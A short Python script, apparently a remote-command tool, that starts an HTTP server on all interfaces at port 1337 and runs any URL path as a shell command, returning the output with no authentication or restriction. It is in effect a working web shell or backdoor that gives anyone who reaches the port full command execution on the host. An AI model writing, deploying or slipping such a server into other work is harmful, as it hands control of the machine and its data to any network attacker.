import http.server
import socketserver
from http import HTTPStatus
import subprocess
from urllib.parse import unquote

class CommandHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Parse the command from the URL query
        command = unquote(self.path[1:])  # Remove the leading '/' and decode URL encoding
        if command:
            try:
                # Run the command and capture the output
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                self.send_response(HTTPStatus.OK)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(output.encode('utf-8'))
            except subprocess.CalledProcessError as e:
                # Handle errors in command execution
                self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(str(e).encode('utf-8'))
        else:
            # Handle case where no command is provided
            self.send_response(HTTPStatus.BAD_REQUEST)
            self.send_header('Content-type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write(b"No command provided.")

httpd = socketserver.TCPServer(('0.0.0.0', 1337), CommandHandler)
try:
    print("Server started at http://0.0.0.0:1337")
    httpd.serve_forever()
except KeyboardInterrupt:
    print("Server is stopped.")
    httpd.server_close()
